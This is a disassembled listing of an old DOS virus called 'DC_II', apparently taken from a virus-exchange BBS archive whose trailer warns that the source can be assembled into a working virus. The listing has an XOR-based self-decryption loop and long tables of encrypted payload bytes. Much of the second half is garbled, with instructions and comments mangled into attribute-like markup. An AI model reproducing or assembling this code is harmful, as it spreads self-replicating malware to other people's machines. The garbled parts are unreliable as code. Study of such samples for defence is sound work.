

  
PAGE  60,132
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        DC_II				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   25-Oct-89					         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
DATA_6E		EQU	0FFB5H				; (6CAF:FFB5=4309H)
  
CODESEG		SEGMENT
		ASSUME	CS:CODESEG, DS:CODESEG
  
  
		ORG	100h
  
dc_ii		PROC	FAR
  
start:
		JMP	LOC_1
DATA_1		DB	0CDH				; Data table (indexed access)
		DB	21H
LOC_1:
		CALL	SUB_1
		DB	0FEH
  
dc_ii		ENDP
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
SUB_1		PROC	NEAR
		POP	SI
		SUB	SI,103H
		CMP	SI,0
		JE	LOC_3				; Jump if equal
		MOV	DL,CS:DATA_1[SI]		; (6CAF:0103=0CDH)
		LEA	DI,DATA_2[SI]			; (6CAF:0129=7) Load effective addr
		LEA	CX,DATA_4[SI]			; (6CAF:06EA=0B4H) Load effective addr
		LEA	BX,DATA_3[SI]			; (6CAF:0138=5) Load effective addr
		SUB	CX,BX
		CLI					; Disable interrupts
  
LOCLOOP_2:
		MOV	AL,CS:[BX]
		MOV	BYTE PTR CS:[DI],22H		; '"'
		XOR	AL,DL
		ROR	DL,1				; Rotate
		MOV	CS:[BX],AL
		INC	BX
		MOV	BYTE PTR CS:[DI],32H		; '2'
		LOOP	LOCLOOP_2			; Loop if cx > 0
  
		STI					; Enable interrupts
LOC_3:
		SAR	BYTE PTR [BX+3BH],1		; Shift w/sign fill
		ESC	4,DH
		JMP	LOC_17
SUB_1		ENDP
  
		DB	0F0H, 60H, 0B8H, 52H, 53H, 1DH
		DB	0FDH, 44H, 7EH, 7FH, 0FH, 0DFH
		DB	13H, 4, 51H, 4DH, 0A2H, 51H
		DB	37H, 5BH, 5, 0F1H, 0D5H, 75H
		DB	7AH, 75H, 0B8H, 0F1H, 67H, 73H
		DB	0D1H, 0FAH, 73H, 0EBH, 0D5H, 0D8H
		DB	5BH, 0EDH, 36H, 0DCH, 0CDH, 0BFH
		DB	0A1H, 51H, 37H, 56H, 0FDH, 0FCH
		DB	0E1H, 42H, 0BFH, 0DFH, 9AH, 0FDH
		DB	0D5H, 3BH, 7AH, 0C3H, 0BEH, 0DFH
		DB	7FH, 1CH, 0F3H, 6DH, 0D0H, 0B9H
		DB	3BH, 63H, 0EEH, 0F6H, 6BH, 16H
		DB	0B3H, 0EFH, 0CAH, 0D3H, 4, 0F3H
		DB	0FBH, 0FDH, 84H, 7CH, 0C5H, 0DCH
		DB	0EFH, 0F7H, 0FBH, 0FDH, 0C3H, 77H
		DB	0BFH, 0DFH, 0EFH, 0F7H, 0FBH, 45H
		DB	0FEH, 33H, 72H, 0FEH, 0E3H, 0CAH
		DB	0FEH, 0FDH, 8AH, 64H, 5, 0F4H
		DB	0E3H, 0CAH, 0F9H, 0FDH, 8AH, 6CH
		DB	5, 3DH, 0E4H, 0CAH, 0F3H, 0FDH
		DB	8AH, 74H, 5, 0DFH, 0EFH, 0F5H
		DB	0FBH, 0FCH, 1, 73H, 0B5H, 0DEH
		DB	0C5H, 0D9H, 0BEH, 0A5H, 0BBH, 7FH
		DB	95H, 0F1H, 0ACH, 0B8H, 0B6H, 0FDH
		DB	0DEH, 7FH, 0BFH, 36H, 0EFH, 0F7H
		DB	78H, 3, 0FEH, 0AH, 0BCH, 36H
		DB	3AH, 0F7H, 0D5H, 76H, 7AH, 0E0H
		DB	0BEH, 0E2H, 0A2H, 0ADH, 8EH, 0F4H
		DB	0D0H, 0B9H, 3BH, 43H, 0EEH, 0F6H
		DB	10H, 0E6H, 6EH, 51H, 79H, 5BH
		DB	73H, 0F6H, 0FBH, 70H, 42H, 0E0H
		DB	0BEH, 64H, 0EFH, 0F6H, 42H, 0F3H
		DB	0FEH, 0F4H, 0BAH, 56H, 0E8H, 0B4H
		DB	0B8H, 0BAH, 0B9H, 9DH, 49H, 0F1H
		DB	64H, 73H, 6BH, 0FCH, 0D0H, 0F6H
		DB	3BH, 4DH, 0EEH, 0D9H, 70H, 79H
		DB	6AH, 7EH, 91H, 56H, 6BH, 61H
		DB	0FAH, 0D3H, 75H, 0FBH, 0AH, 0DEH
		DB	0C1H, 7EH, 7FH, 65H, 0FFH, 0CBH
		DB	95H, 12H, 0CEH, 0D9H, 0C2H, 69H
		DB	3FH, 7EH, 0C3H, 0DCH, 4, 8AH
		DB	6BH, 0D3H, 0C4H, 0FBH, 3, 0DEH
		DB	9AH, 0F4H, 10H, 8EH, 6EH, 0F2H
		DB	23H, 46H, 0EDH, 4EH, 0E1H, 0FDH
		DB	0D0H, 0F5H, 0A8H, 6BH, 0EDH, 3AH
		DB	0DAH, 0BEH, 1CH, 89H, 32H, 43H
		DB	5, 0F1H, 43H, 0FDH, 0FFH, 4CH
		DB	76H, 0F1H, 66H, 0F0H, 0B8H, 0BEH
		DB	0, 0BBH, 0FEH, 5CH, 16H, 0D7H
		DB	85H, 0EH, 73H, 0E3H, 55H, 0D9H
		DB	5AH, 0F7H, 41H, 7DH, 0FEH, 0CAH
		DB	0BFH, 6FH, 0EFH, 46H, 0FDH, 2FH
		DB	1EH, 0F5H, 77H, 5FH, 26H, 0F6H
		DB	43H, 0FDH, 0FBH, 0B2H, 0ACH, 0ADH
		DB	0E5H, 9, 3DH, 7DH, 0, 76H
		DB	0CAH, 3AH, 56H, 0F2H, 0FBH, 49H
		DB	0FCH, 0CDH, 0B8H, 12H, 0CEH, 15H
		DB	3, 16H, 0, 75H, 0B2H, 0F5H
		DB	0CFH, 0B3H, 0BAH, 0A9H, 0BFH, 3CH
		DB	0EDH, 96H, 0A2H, 0B2H, 0DBH, 0B4H
		DB	0B7H, 5FH, 0E9H, 96H, 0BDH, 0A2H
		DB	0A8H, 0DDH, 0D4H, 75H, 0B2H, 6BH
		DB	0F6H, 3AH, 0DAH, 0D3H, 76H, 0FBH
		DB	6DH, 0DEH, 5BH, 0B0H, 0C8H, 2FH
		DB	0A8H, 0F2H, 0BH, 34H, 0E9H, 3AH
		DB	0DAH, 0A3H, 0D0H, 0B9H, 3BH, 1CH
		DB	0EEH, 0F7H, 13H, 98H, 0FEH, 0F2H
		DB	23H, 62H, 0EEH, 47H, 0FBH, 0D3H
		DB	76H, 0FBH, 0D8H, 0DCH, 0C1H, 7DH
		DB	7FH, 3EH, 0FFH, 51H, 41H, 5BH
		DB	2CH, 0F6H, 63H, 0FEH, 26H, 51H
		DB	35H, 0D8H, 65H, 27H, 0C7H, 2
		DB	8BH, 7CH, 56H, 0E2H, 0ECH, 77H
		DB	1, 0FCH, 8BH, 6FH, 91H, 55H
		DB	6BH, 4BH, 0FAH, 0C1H, 0FFH, 0BH
		DB	71H, 0E3H, 0EDH, 82H, 0F8H, 14H
		DB	0C9H, 80H, 0BH, 0D1H, 22H, 0D6H
		DB	4FH, 0BAH, 4CH, 7FH, 0E9H, 52H
		DB	5BH, 0FCH, 0FCH, 30H, 0DFH, 21H
		DB	32H, 43H, 88H, 0F4H, 0D5H, 77H
		DB	0F9H, 43H, 0BCH, 0AAH, 0E8H, 47H
		DB	0FBH, 0D3H, 76H, 78H, 54H, 7AH
		DB	7, 0D5H, 0FAH, 15H, 60H, 7FH
		DB	0CCH, 0EBH, 4, 6CH, 0C8H, 3DH
		DB	0E0H, 0F1H, 67H, 64H, 7FH, 0F7H
		DB	70H, 0BAH, 0FCH, 51H, 36H, 5BH
		DB	65H, 0F6H, 70H, 0FAH, 0D0H, 0F6H
		DB	3BH, 53H, 0EEH, 7BH, 33H, 74H
		DB	0B9H
		DB	7DH
LOC_4:
		XOR	BL,SS:DATA_6E[BP+DI]		; (6CAF:FFB5=9)
		HLT					; Halt processor
		JC	LOC_4				; Jump if carry Set
		LOOPZ	LOC_18				; Loop if zf=1, cx>0
  
		JMP	LOC_16
		DB	0F7H, 0A5H, 4DH, 0FDH, 51H, 37H
		DB	9BH, 0E6H, 0A9H, 34H, 0FDH, 47H
		DB	3FH, 0BFH, 89H, 0A0H, 0B8H, 0B4H
		DB	3AH, 0FBH, 5FH, 0E3H, 54H, 1CH
		DB	0BH, 57H, 57H, 0B7H, 43H, 0BFH
		DB	0AAH, 16H, 0A9H, 4FH, 0C6H, 73H
		DB	0EBH, 95H, 0D8H, 22H, 0D6H, 13H
		DB	35H, 0FEH, 97H, 0FBH, 0DFH, 9CH
		DB	2DH, 4FH, 0C6H, 73H, 0EBH, 0B5H
		DB	0D8H, 22H, 0D6H, 0D5H, 3, 7AH
		DB	0C4H, 0BEH, 37H, 0DDH, 0F7H, 88H
		DB	0FEH, 17H, 0F0H, 0BDH, 0F1H, 65H
		DB	73H, 40H, 0FCH, 0C2H, 7FH, 0CAH
		DB	0DAH, 6CH, 34H, 0F2H, 16H, 49H
		DB	0CBH, 0F0H, 8FH, 22H, 0D6H, 0A3H
		DB	8EH, 0FDH, 96H, 0AAH, 20H, 0BFH
		DB	43H, 0D4H, 30H, 0DFH, 0FCH, 7CH
		DB	0CAH, 5FH, 0E7H, 0D5H, 0C5H, 0F9H
		DB	27H, 0CAH, 3AH, 11H, 3FH, 10H
		DB	25H, 73H, 0C3H, 94H, 0D8H, 56H
		DB	0CDH, 0FBH, 4DH, 0FEH, 83H, 4CH
		DB	75H, 5BH, 0B0H, 0ADH, 0CEH, 2CH
		DB	0F2H, 0BH, 0F4H, 0E8H, 3AH, 0DAH
		DB	0A3H, 2, 0F2H, 3, 0F4H, 0E8H
		DB	4EH, 0BBH, 0FDH, 4EH, 7FH, 4DH
		DB	71H, 9BH, 0F5H, 2, 3EH, 0B1H
		DB	30H, 35H, 0DAH, 0D3H, 0ABH, 8FH
		DB	0FEH, 0B9H, 0CFH, 0E3H, 0F1H, 67H
		DB	0F2H, 0BCH, 4DH, 0D4H, 51H, 37H
		DB	0DAH, 0A8H, 47H, 0D5H, 0D3H, 76H
		DB	7AH, 0F8H, 6FH, 0C5H, 0D9H, 73H
		DB	0F8H, 0B9H, 0F2H, 2BH, 0F5H, 0E8H
		DB	43H, 0B5H, 44H, 0EEH, 7FH, 72H
		DB	0FEH, 9CH, 0F6H, 38H, 49H, 0D1H
		DB	79H, 72H, 0FEH, 6CH, 34H, 0EEH
		DB	4DH, 0EEH, 59H, 87H, 0D8H, 0E8H
		DB	82H, 0E9H, 5, 4AH, 50H, 0B9H
		DB	12H, 0CEH, 74H, 38H, 0E3H, 4EH
		DB	51H, 91H, 0E7H, 0E8H, 0F0H, 8FH
		DB	0FCH, 3DH, 0CBH, 0F0H, 12H, 0CEH
		DB	84H, 23H, 4, 3DH, 0CBH, 0F1H
		DB	66H, 0E8H, 0F7H, 76H, 69H, 3AH
		DB	7EH, 72H, 0FEH, 9DH, 0E6H, 13H
		DB	0D0H, 0FEH, 0CBH, 0F0H, 66H, 0E8H
		DB	0F7H, 36H, 0DCH, 8CH, 7AH, 57H
		DB	0FEH, 0EFH, 1CH, 9, 70H, 6AH
		DB	0B5H, 0BEH, 6BH, 0A1H, 4EH, 0FCH
		DB	0FDH, 33H, 5EH, 0CDH, 0CEH, 7
		DB	0F8H, 0FBH, 49H, 0B1H, 0C6H, 0B8H
		DB	0DFH, 22H, 0D6H, 89H, 0F8H, 16H
		DB	7CH, 0BFH, 34H, 1DH, 34H, 4FH
		DB	0D2H, 0F8H, 0B2H, 9EH, 5CH, 2CH
		DB	0E8H, 0DDH, 77H, 0F9H, 78H, 83H
		DB	9DH, 9AH, 0F6H, 38H, 49H, 0D1H
		DB	79H, 72H, 0FEH, 6CH, 34H, 0EDH
		DB	0DBH, 75H, 70H, 3CH, 1CH, 0EDH
		DB	0D1H, 70H, 0EAH, 0F9H, 0F5H, 7EH
		DB	0FBH, 0FH, 7DH, 1BH, 0ACH, 47H
		DB	7AH, 0BFH, 0DH, 7, 0AEH, 0F1H
		DB	39H, 0FAH, 7AH, 85H, 1EH, 9BH
		DB	0F2H, 71H, 35H, 15H, 7DH, 2FH
		DB	1CH, 0B7H, 0AFH, 0AAH, 0AFH, 0E0H
		DB	79H, 0BH, 0F0H, 22H, 0D6H, 77H
		DB	3DH, 70H, 0A7H, 57H, 0C3H, 0EEH
		DB	84H, 0FCH, 0FAH, 0E1H, 25H, 0E6H
		DB	36H, 4, 0AH, 70H, 2EH, 7DH
		DB	0BDH, 0A1H, 67H, 0EDH, 0CAH, 36H
		DB	0DCH, 75H, 0A7H, 0B8H, 0C0H, 5BH
		DB	0C8H, 76H, 69H, 61H, 7EH, 6
		DB	0C3H, 0EFH, 3AH, 0DAH, 0D3H, 74H
		DB	0DBH, 20H, 0DEH, 0C1H, 7DH, 7FH
		DB	5DH, 0FFH, 42H, 0E5H, 92H, 9BH
		DB	0F4H, 12H, 64H, 0FEH, 51H, 34H
		DB	5BH, 5CH, 0F6H, 0D5H
LOC_5:
		JZ	LOC_6				; Jump if zero
		OUT	DX,AX				; port 0, DMA-1 bas&add ch 0
		MOV	SI,64F1H
		JNC	LOC_19				; Jump if carry=0
		CLD					; Clear direction
		SAL	DH,1				; Shift w/zeros fill
		CMP	CX,[BP+DI-12H]
		ESC	1,DATA_7[BX+SI]			; (6CAF:0079=0)
		JNS	LOC_20				; Jump if not sign
		JLE	LOC_5				; Jump if < or="IN" al,dx="" ;="" port="" 0,="" dma-1="" bas&add="" ch="" 0="" xor="" al,0c4h="" xor="" ch,[si]="" db="" 2eh="" ;="" cs:="" cmc="" ;="" complement="" carry="" jnc="" loc_21="" ;="" jump="" if="" carry="0" aaa="" ;="" ascii="" adjust="" jz="" loc_22="" ;="" jump="" if="" zero="" std="" ;="" set="" direction="" flag="" mov="" bh,[bx+di+3eh]="" sbb="" al,0efh="" out="" 19h,ax="" ;="" port="" 19h="" pop="" es="" dec="" di="" jbe="" loc_23="" ;="" jump="" if="" below="" or="AAS" ;="" ascii="" adjust="" push="" si="" db="" 0f3h,="" 0fbh,="" 0d3h,="" 75h,="" 0ebh,="" 18h="" db="" 0deh,="" 3ch,="" 15h,="" 0abh,="" 0d6h,="" 3ch="" db="" 51h,="" 36h,="" 43h,="" 5ah,="" 0f6h,="" 0d5h="" db="" 74h,="" 62h,="" 0d2h,="" 0beh,="" 0f1h,="" 66h="" db="" 73h,="" 48h,="" 0fch,="" 47h,="" 7fh,="" 0bdh="" db="" 0f1h,="" 66h,="" 7bh,="" 5ah,="" 0fch,="" 47h="" db="" 81h,="" 40h,="" 0f1h,="" 66h,="" 7bh,="" 54h="" db="" 0fch,="" 0d0h,="" 0f4h,="" 33h,="" 7ch,="" 0eeh="" db="" 74h,="" 3ah,="" 0feh,="" 0d0h,="" 0f6h,="" 33h="" db="" 7ch,="" 0eeh,="" 26h,="" 10h,="" 2ch,="" 15h="" db="" 0aeh,="" 54h,="" 0eh,="" 4,="" 71h,="" 24h="" db="" 76h,="" 35h,="" 25h,="" 7,="" 0dfh,="" 0adh="" db="" 0ach,="" 36h,="" 0dch,="" 16h,="" 7ah,="" 0beh="" loc_6:="" db="" 67h,="" 0efh,="" 0b5h,="" 0c8h,="" 34h,="" 0cdh="" db="" 0adh="" db="" 72h,="" 0feh,="" 5bh,="" 0b7h,="" 42h,="" 0e1h="" db="" 0feh,="" 0f2h,="" 2bh,="" 40h,="" 0eeh,="" 3ah="" db="" 0dah,="" 16h,="" 0c9h,="" 0efh,="" 7,="" 0ddh="" db="" 0adh,="" 0c4h,="" 32h,="" 0ceh="" db="" 2ch="" db="" 0b2h,="" 9eh,="" 37h,="" 0dh,="" 0f7h,="" 43h="" db="" 0fdh,="" 0bch,="" 4ch,="" 76h,="" 0ech,="" 3dh="" db="" 3ah,="" 0dah,="" 49h,="" 0d1h,="" 2ch,="" 0b9h="" db="" 12h,="" 0ceh="" db="" 74h,="" 38h,="" 0e7h,="" 0d8h,="" 0f4h,="" 0b8h="" db="" 0d8h,="" 0b4h,="" 0dah,="" 0f8h,="" 0fdh,="" 0d0h="" db="" 0f6h,="" 3bh,="" 0bh,="" 0eeh,="" 43h,="" 0bbh="" db="" 44h,="" 0fdh,="" 7fh,="" 32h,="" 4bh,="" 3ch="" db="" 0f6h,="" 36h,="" 0dch,="" 0a4h,="" 26h,="" 7="" db="" 0deh,="" 0b8h,="" 3ah,="" 0dah,="" 49h,="" 0c0h="" db="" 0b2h,="" 9eh,="" 37h,="" 0c3h,="" 0f7h,="" 4fh="" db="" 0c6h,="" 73h,="" 0ebh,="" 0b5h,="" 0d8h,="" 22h="" db="" 0d6h,="" 10h,="" 0c7h,="" 6eh,="" 0cbh,="" 90h="" db="" 0d9h,="" 0bch,="" 3ah,="" 0dah,="" 76h,="" 2dh="" db="" 0fch,="" 7dh,="" 0c1h,="" 57h,="" 0f7h,="" 0b8h="" db="" 30h,="" 0dfh,="" 24h,="" 0b8h,="" 0f1h,="" 66h="" db="" 7bh,="" 2bh,="" 0fch,="" 7fh,="" 9eh,="" 41h="" db="" 0dfh,="" 57h,="" 0f6h,="" 0b8h,="" 30h,="" 0dfh="" db="" 0bch,="" 91h,="" 54h,="" 63h,="" 27h,="" 0fah="" db="" 49h,="" 0d1h,="" 79h,="" 0ech,="" 12h,="" 0ceh="" db="" 7ch,="" 28h,="" 7eh,="" 3ch,="" 61h,="" 7="" db="" 0deh,="" 0ach="" db="" 3ah="" db="" 0dah,="" 0a6h,="" 0f9h,="" 0bch,="" 0bh,="" 0d1h="" db="" 0c1h,="" 7dh,="" 6fh,="" 2fh,="" 0ffh,="" 0b2h="" db="" 9eh,="" 6bh,="" 0d4h,="" 7ah,="" 6fh,="" 17h="" db="" 0f8h,="" 0b2h,="" 9eh,="" 37h,="" 0d5h,="" 0f7h="" db="" 0fch,="" 0e2h,="" 4ah,="" 65h,="" 5="" loc_12:="" pop="" di="" out="" dx,ax="" ;="" port="" 0,="" dma-1="" bas&add="" ch="" 0="" cmp="" bl,dl="" jbe="" loc_13="" ;="" jump="" if="" below="" or="INC" dx="" mov="" di,9bdfh="" rcl="" bp,1="" ;="" rotate="" thru="" carry="" ja="" loc_24="" ;="" jump="" if="" above="" jcxz="" loc_25="" ;="" jump="" if="" cx="0" jcxz="" loc_12="" ;="" jump="" if="" cx="0" and="" bl,0d3h="" jnz="" loc_26="" ;="" jump="" if="" not="" zero="" sub="" si,bx="" db="" 0c1h,="" 7ch,="" 67h,="" 65h,="" 0ffh,="" 71h="" db="" 0e6h,="" 0f4h,="" 24h,="" 0f4h,="" 33h,="" 0ach="" db="" 0d0h,="" 0f4h,="" 3bh,="" 4dh,="" 0eeh,="" 0a7h="" db="" 30h,="" 46h,="" 0feh,="" 7eh,="" 40h,="" 3ch="" db="" 5bh,="" 0bbh,="" 36h,="" 0dch,="" 0cdh,="" 0bfh="" db="" 0a1h,="" 51h,="" 37h,="" 4ch,="" 6bh,="" 0fdh="" db="" 0d0h="" loc_13:="" hlt="" ;="" halt="" processor="" cmp="" dx,[di-12h]="" jle="" loc_12="" ;="" jump="" if="">< or="PUSH" word="" ptr="" [di-5]="" xor="" bx,si="" db="" 66h,="" 0f0h,="" 0e4h,="" 3eh,="" 0adh,="" 0f2h="" db="" 33h,="" 0f5h,="" 0e8h,="" 7ch,="" 2ah,="" 70h="" db="" 62h,="" 0c6h,="" 0b9h,="" 0f4h,="" 24h,="" 74h="" db="" 12h,="" 0bdh,="" 0d0h,="" 0f5h,="" 0b8h,="" 58h="" db="" 35h,="" 0d9h,="" 73h,="" 0fah,="" 79h,="" 0a5h="" db="" 0fch,="" 9dh,="" 0dh,="" 5,="" 10h,="" 8fh="" db="" 6eh,="" 97h,="" 0b0h,="" 0dfh,="" 0b4h,="" 7ah="" db="" 77h,="" 17h,="" 0f8h,="" 0f2h,="" 2bh,="" 0dfh="" db="" 0eeh,="" 0dch,="" 31h,="" 49h,="" 0beh,="" 0b2h="" db="" 9eh,="" 0f1h,="" 65h,="" 63h,="" 0f8h,="" 0fch="" db="" 0adh,="" 0f2h,="" 33h,="" 35h,="" 0e9h,="" 7ah="" db="" 67h,="" 0c5h,="" 0ffh,="" 54h,="" 74h,="" 0f1h="" db="" 65h,="" 0f0h,="" 0c9h,="" 3fh,="" 2eh,="" 0b5h="" db="" 91h,="" 57h,="" 0e8h="" data_4="" db="" 0b4h="" ;="" data="" table="" (indexed="" access)="" db="" 19h,="" 0eh,="" 0a5h,="" 0bch="" codeseg="" ends="" end="" start="" ;****************************************************************************;="" ;="" ;="" ;="" -="][][][][][][][][][][][][][][][=-" ;="" ;="" -="]" p="" e="" r="" f="" e="" c="" t="" c="" r="" i="" m="" e="" [="-" ;="" ;="" -="]" +31.(o)79.426o79="" [="-" ;="" ;="" -="]" [="-" ;="" ;="" -="]" for="" all="" your="" h/p/a/v="" files="" [="-" ;="" ;="" -="]" sysop:="" peter="" venkman="" [="-" ;="" ;="" -="]" [="-" ;="" ;="" -="]" +31.(o)79.426o79="" [="-" ;="" ;="" -="]" p="" e="" r="" f="" e="" c="" t="" c="" r="" i="" m="" e="" [="-" ;="" ;="" -="][][][][][][][][][][][][][][][=-" ;="" ;="" ;="" ;="" ***="" not="" for="" general="" distribution="" ***="" ;="" ;="" ;="" ;="" this="" file="" is="" for="" the="" purpose="" of="" virus="" study="" only!="" it="" should="" not="" be="" passed="" ;="" ;="" around="" among="" the="" general="" public.="" it="" will="" be="" very="" useful="" for="" learning="" how="" ;="" ;="" viruses="" work="" and="" propagate.="" but="" anybody="" with="" access="" to="" an="" assembler="" can="" ;="" ;="" turn="" it="" into="" a="" working="" virus="" and="" anybody="" with="" a="" bit="" of="" assembly="" coding="" ;="" ;="" experience="" can="" turn="" it="" into="" a="" far="" more="" malevolent="" program="" than="" it="" already="" ;="" ;="" is.="" keep="" this="" code="" in="" responsible="" hands!="" ;="" ;="" ;="" ;****************************************************************************;="">